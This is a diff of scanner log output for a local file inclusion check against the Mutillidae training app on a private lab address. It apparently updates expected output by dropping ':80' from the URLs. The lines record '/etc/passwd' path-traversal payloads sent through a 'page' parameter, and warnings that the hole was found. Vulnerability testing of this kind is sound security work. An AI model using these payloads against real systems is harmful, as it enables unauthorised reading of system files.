@@ -3,6 +3,6 @@ Starting ScanLocalFileInclusion scan
 INFO - 	Testing payload: etc/passwd on http://192.168.232.129:80/mutillidae/index.php as http://192.168.232.129:80/mutillidae/index.php?page=etc%2Fpasswd
 INFO - 	Testing payload: /etc/passwd on http://192.168.232.129:80/mutillidae/index.php as http://192.168.232.129:80/mutillidae/index.php?page=%2Fetc%2Fpasswd
 WARNING - Local file inclusion vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=%2Fetc%2Fpasswd with payload: /etc/passwd
-INFO - 	Testing payload: etc/passwd on http://192.168.232.129:80/mutillidae/ as http://192.168.232.129:80/mutillidae/?page=etc%2Fpasswd
-INFO - 	Testing payload: /etc/passwd on http://192.168.232.129:80/mutillidae/ as http://192.168.232.129:80/mutillidae/?page=%2Fetc%2Fpasswd
-WARNING - Local file inclusion vulnerability found at: http://192.168.232.129:80/mutillidae/?page=%2Fetc%2Fpasswd with payload: /etc/passwd
+INFO - 	Testing payload: etc/passwd on http://192.168.232.129/mutillidae/index.php as http://192.168.232.129/mutillidae/index.php?page=etc%2Fpasswd
+INFO - 	Testing payload: /etc/passwd on http://192.168.232.129/mutillidae/index.php as http://192.168.232.129/mutillidae/index.php?page=%2Fetc%2Fpasswd
+WARNING - Local file inclusion vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=%2Fetc%2Fpasswd with payload: /etc/passwd
